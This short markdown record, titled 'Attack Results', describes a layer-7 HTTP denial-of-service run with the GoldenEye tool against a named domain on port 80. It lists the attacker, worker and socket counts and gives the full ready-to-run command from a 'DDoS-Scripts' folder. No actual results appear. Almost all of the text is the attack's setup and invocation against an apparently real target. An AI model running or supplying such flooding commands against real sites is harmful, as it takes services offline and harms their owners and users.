# Attack Results

## Description

- Type: HTTP Keep Alive + NoCache
- Number of attackers: 2
- HTTP Method: GET
- Target port: 80
- Target: radiumoxide.com
- Number of concurrent workers: 50
- Number of concurrent sockets: 200
- Attack tool: 007 GoldenEye
- Attack Command: `python2.7 DDoS-Scripts/Layer-7/007-GoldenEye/goldeneye.py https://radiumoxide.com -w 10 -s 200 -m get`
